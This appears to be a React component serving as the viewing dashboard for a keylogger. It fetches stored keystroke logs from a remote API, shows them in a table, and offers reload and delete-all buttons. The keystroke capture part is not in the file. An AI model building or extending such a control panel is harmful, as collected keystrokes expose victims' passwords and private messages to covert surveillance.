import React, { useState } from 'react'

const Table = ({ title, data, setData }) => {
    const columns = data[0] && Object.keys(data[0])
    const [isPending, setIsPending] = useState(false)
    
    const deleteAll=()=>{
        fetch('https://keylogging.pythonanywhere.com/api/delete_all', {
            method: 'GET',
            body: JSON.stringify(),
            headers: {
                "Contect-Type": "application/json; charset=UTF-8"
            }
        }).then(responce => {
            if (!responce.ok) {
              alert("Internal server error")
            }
            return responce.json();
        }).then(data => {
          
            alert('Deleted successfully')
            getLatestLogs()
            
        }).catch(error => {
            console.log(error.responce, error.status, error.headers)
        })
    }

    const getLatestLogs=()=>{
        setIsPending(true)
        fetch('https://keylogging.pythonanywhere.com/api/keylogs', {
            method: 'GET',
            body: JSON.stringify(),
            headers: {
                "Contect-Type": "application/json; charset=UTF-8"
            }
        }).then(responce => {
            if (!responce.ok) {
              alert("Internal server error")
            }
            return responce.json();
        }).then(data => {
            console.log("success")
            setIsPending(false)
            setData(data)
            
        }).catch(error => {
            console.log(error.responce, error.status, error.headers)
        })

    }
    return (
        <div>
            {data.length > 0 && !isPending && <button className='button mb-5' onClick={() => deleteAll()}>Delete all</button>}
            {data.length > 0 && !isPending && <button className='button mb-5 ps-2' onClick={() => getLatestLogs()} >Reload</button>}
            {isPending && <div className='loginAlert mb-2'>Reloading...</div>}
            {data.length > 0 ? 
            <table className='table'>
                <thead>
                    <tr>
                        {data[0] && columns.map((heading) =>
                            <th>{heading}</th>)}
                    </tr>
                </thead>

                <tbody>
                    {data.map(row => <tr>
                        {columns.map(column => <td>{row[column]}</td>)}
                    </tr>)}
                </tbody>
            </table> :
            <div className='loginAlert'><h2>No keylogs to display</h2></div>}
        </div>
    )
}

export default Table
